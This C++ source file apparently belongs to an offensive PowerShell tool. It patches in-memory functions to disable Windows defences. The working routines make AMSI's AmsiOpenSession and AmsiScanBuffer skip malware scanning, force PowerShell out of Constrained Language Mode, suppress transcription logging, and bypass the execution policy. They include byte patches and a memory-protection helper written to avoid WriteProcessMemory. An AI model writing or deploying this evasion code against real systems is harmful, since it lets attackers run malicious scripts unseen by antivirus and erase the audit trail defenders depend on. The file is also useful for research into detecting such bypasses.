#include "common.h"
#include "patch.h"
#include "clr.h"

//
// The following function patches 'AMSI!AmsiOpenSession' so that it returns the
// error code 0x80070057 (invalid parameters) when invoked. It does so by replacing
// a conditonal jump (JZ) at the beginning of the function with a simple jump (JMP).
// 
// Below is the part of AMSI!AmsiOpenSession we're interest in:
// 
//   48 85 d2        TEST       param_2,param_2    <-- Test if return value pointer is null
//   74 0c           JZ         LAB_180008aa1      <-- Conditional JZ replaced by JMP
//   ...
//   b8 57 00        MOV        EAX,0x80070057     <-- Return error code 0x80070057
//   07 80
//   c3              RET
// 
// Credit:
//   - https://github.com/anonymous300502/Nuke-AMSI
//
BOOL PatchAmsiOpenSession()
{
    BYTE bPatch[] = { 0xeb };

    return PatchUnmanagedFunction(
        L"amsi",
        "AmsiOpenSession",
        bPatch,
        ARRAYSIZE(bPatch),
        3
    );
}

//
// The following function patches 'AMSI!AmsiScanBuffer' so that its third parameter,
// i.e. the one containing the length of the input buffer is always set to 0. Doing
// so causes the function to never scan the input buffer.
// 
//   ...
//   41 8b f8        MOV        EDI,param_3         <-- Copy buffer length to EDI
//   48 8b f2        MOV        RSI,param_2         <-- Copy buffer address to RSI
//   ...
//
// The instruction 'MOV EDI,param_3' is replaced by 'XOR RDI,RDI', which has the same
// size and effectively set RDI to 0.
//
BOOL PatchAmsiScanBuffer()
{
    BYTE bPattern[] = { 0x41, 0x8b, 0xf8 }; // mov edi,r8d
    BYTE bPatch[] = { 0x48, 0x31, 0xff }; // xor rdi,rdi 
    ULONG_PTR pAmsiScanBuffer;
    DWORD dwPatternOffset;

    if (!GetProcedureAddress(L"amsi", "AmsiScanBuffer", &pAmsiScanBuffer))
        return FALSE;

    if (!FindBufferOffset(reinterpret_cast<LPVOID>(pAmsiScanBuffer), bPattern, ARRAYSIZE(bPattern), 100, &dwPatternOffset))
        return FALSE;

    //wprintf(L"[*] Found instruction to patch in AmsiScanBuffer @ 0x%llx (offset: %d)\n", pAmsiScanBuffer + dwPatternOffset, dwPatternOffset);

    return PatchUnmanagedFunction(
        L"amsi",
        "AmsiScanBuffer",
        bPatch,
        ARRAYSIZE(bPatch),
        dwPatternOffset
    );
}

//
// PowerShell uses the method 'GetSystemLockdownPolicy' (SystemPolicy) to get the
// value of the execution policy enforced on the system. By patching this method
// with the following instructions, we force it to always return the value
// SystemEnforcementMode.None, which to translates to "Full Language Mode".
// 
//   xor rax, rax;   <-- Set return value to 0
//   ret;
// 
// Credit:
//   - https://github.com/calebstewart/bypass-clm
//
BOOL PatchSystemPolicyGetSystemLockdownPolicy(mscorlib::_AppDomain* pAppDomain)
{
    BYTE bPatch[] = { 0x48, 0x31, 0xc0, 0xc3 }; // mov rax, 0; ret;

    return PatchManagedFunction(
        pAppDomain,
        L"System.Management.Automation",
        L"System.Management.Automation.Security.SystemPolicy",
        L"GetSystemLockdownPolicy",
        0,
        bPatch,
        ARRAYSIZE(bPatch),
        0
    );
}

//
// When transcription is enabled, PowerShell uses a class named 'TranscriptionOption'
// to store information about the log file path for instance. It also has a method
// named 'FlushContentToDisk' responsible for writing user prompts to this file. By
// patching this method with a simple 'ret' instruction, we effectively prevent it
// from writing anything to disk.
// 
// Credit:
//   - https://github.com/OmerYa/Invisi-Shell
// 
// Links:
//   - https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/hostifaces/MshHostUserInterface.cs
//
BOOL PatchTranscriptionOptionFlushContentToDisk(mscorlib::_AppDomain* pAppDomain)
{
    BYTE bPatch[] = { 0xc3 }; // ret;

    return PatchManagedFunction(
        pAppDomain,
        L"System.Management.Automation",
        L"System.Management.Automation.Host.TranscriptionOption",
        L"FlushContentToDisk",
        0,
        bPatch,
        ARRAYSIZE(bPatch),
        0
    );
}

//
// Whatever the execution policy enforced on a system, the class 'AuthorizationManager'
// (System.Management.Automation) is in charge of determining whether a given script
// file should be executed, thanks to its internal method 'ShouldRunInternal'. This
// method does not return a boolean value, but instead throws an exception in case the
// execution is restricted. Therefore, by patching this function with a simple 'ret'
// instruction, we make it so that this function never throws an exception, this
// circumventing the execution policy.
// 
// This technique was inspired by a blog post from NetSPI (see credit section), which
// mentions the 'AuthorizationManager' class (technique #12).
// 
// Credit:
//   - https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/
// 
// Links:
//   - https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/SecurityManagerBase.cs
//
BOOL PatchAuthorizationManagerShouldRunInternal(mscorlib::_AppDomain* pAppDomain)
{
    BYTE bPatch[] = { 0xc3 }; // ret;

    return PatchManagedFunction(
        pAppDomain,
        L"System.Management.Automation",
        L"System.Management.Automation.AuthorizationManager",
        L"ShouldRunInternal",
        3,
        bPatch,
        ARRAYSIZE(bPatch),
        0
    );
}

BOOL GetProcedureAddress(LPCWSTR pwszModuleName, LPCSTR pszProcedureName, PULONG_PTR pProcedureAddress)
{
    BOOL bResult = FALSE;
    HMODULE hModule = NULL;
    FARPROC pProcedure = NULL;

    // We assume the module has already been loaded
    hModule = GetModuleHandleW(pwszModuleName);
    EXIT_ON_WIN32_ERROR(L"GetModuleHandleW", hModule == NULL);

    pProcedure = GetProcAddress(hModule, pszProcedureName);
    EXIT_ON_WIN32_ERROR(L"", pProcedure == NULL);

    bResult = TRUE;
    *pProcedureAddress = reinterpret_cast<ULONG_PTR>(pProcedure);

exit:
    return bResult;
}

BOOL PatchProcedure(LPVOID pTargetAddress, LPBYTE pSourceBuffer, DWORD dwSourceBufferSize)
{
    BOOL bResult = FALSE;
    DWORD dwOldProtect = 0;
    BOOL bSuccess = FALSE;

    bSuccess = VirtualProtectEx(GetCurrentProcess(), pTargetAddress, dwSourceBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    EXIT_ON_WIN32_ERROR(L"VirtualProtectEx", bSuccess == FALSE);

    // Avoid using WriteProcessMemory / NtWriteVirtualMemory
    memcpy_s(pTargetAddress, dwSourceBufferSize, pSourceBuffer, dwSourceBufferSize);

    bSuccess = VirtualProtectEx(GetCurrentProcess(), pTargetAddress, dwSourceBufferSize, dwOldProtect, &dwOldProtect);
    EXIT_ON_WIN32_ERROR(L"VirtualProtectEx", bSuccess == FALSE);

    bResult = TRUE;

exit:
    return bResult;
}

BOOL PatchUnmanagedFunction(LPCWSTR pwszMdoduleName, LPCSTR pszProcedureName, LPBYTE pbPatch, DWORD dwPatchSize, DWORD dwPatchOffset)
{
    ULONG_PTR pProcedureAddress = 0;

    if (!GetProcedureAddress(pwszMdoduleName, pszProcedureName, &pProcedureAddress))
        return FALSE;

    pProcedureAddress += dwPatchOffset;

    //printf("[*] Patching unmanaged function '%s' @ 0x%llx\n", pszProcedureName, pProcedureAddress);

    if (!PatchProcedure(reinterpret_cast<LPVOID>(pProcedureAddress), pbPatch, dwPatchSize))
        return FALSE;

    return TRUE;
}

BOOL PatchManagedFunction(mscorlib::_AppDomain* pAppDomain, LPCWSTR pwszAssemblyName, LPCWSTR pwszClassName, LPCWSTR pwszMethodName, DWORD dwNbArgs, LPBYTE pbPatch, DWORD dwPatchSize, DWORD dwPatchOffset)
{
    ULONG_PTR pMethodAddress = 0;

    if (!clr::GetJustInTimeMethodAddress(pAppDomain, pwszAssemblyName, pwszClassName, pwszMethodName, dwNbArgs, &pMethodAddress))
        return FALSE;

    pMethodAddress += dwPatchOffset;

    //wprintf(L"[*] Patching managed function '%ws' @ 0x%llx\n", pwszMethodName, pMethodAddress);

    if (!PatchProcedure(reinterpret_cast<LPVOID>(pMethodAddress), pbPatch, dwPatchSize))
        return FALSE;

    return TRUE;
}

BOOL FindBufferOffset(LPVOID pStartAddress, LPBYTE pBuffer, DWORD dwBufferSize, DWORD dwMaxSize, PDWORD pdwBufferOffset)
{
    BOOL bResult = FALSE;

    for (DWORD i = 0; i < dwMaxSize - dwBufferSize; i++)
    {
        if (memcmp(pBuffer, (LPVOID)((ULONG_PTR)pStartAddress + i), dwBufferSize) == 0)
        {
            *pdwBufferOffset = i;
            bResult = TRUE;
            break;
        }
    }

    if (!bResult)
        PRINT_ERROR(L"Failed to find pattern of size %d within the address range 0x%llx - 0x%llx\n", dwBufferSize, (ULONG_PTR)pStartAddress, (ULONG_PTR)pStartAddress + dwMaxSize);

    return bResult;
}